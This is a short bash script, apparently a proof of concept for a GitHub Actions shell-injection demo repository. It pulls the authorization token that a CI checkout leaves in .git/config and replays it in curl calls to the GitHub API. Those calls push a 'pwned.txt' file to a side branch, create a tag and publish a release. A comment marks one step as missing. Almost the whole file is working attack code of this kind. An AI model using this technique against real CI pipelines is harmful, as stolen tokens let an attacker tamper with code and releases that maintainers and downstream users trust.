#!/usr/bin/env bash

authfield=$(cat .git/config | grep AUTHORIZATION | cut -d':' -f 2)

  
# Inject content to a side branch
curl --request PUT \
  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/contents/pwned.txt \
  --header "Authorization: $authfield" \
  --header "Accept: application/vnd.github.v3+json" \
  --data "{ \"message\": \"upload test artifact\", \"content\": \"$(echo pwned | openssl base64 | tr -d '\n')\", \"branch\": \"minusworld-gha-demo-patch-1\" }"
  
## STEP MISSING: GET COMMIT HASH OF BRANCH
  
# Create a tag using the side branch
curl --request POST \
  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/git/tags \
  --header "Authorization: $authfield" \
  --header "Accept: application/vnd.github.v3+json" \
  --data '{ "tag": "v1.0.2", "message": "Release", "object": "ddee5c447b6ec357415016945c367d072753b63b", "type": "commit" }'

# Create release
curl --request POST \
  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/releases \
  --header "Authorization: $authfield" \
  --header "Accept: application/vnd.github.v3+json" \
  --data '{ "tag_name": "v1.0.2" }'
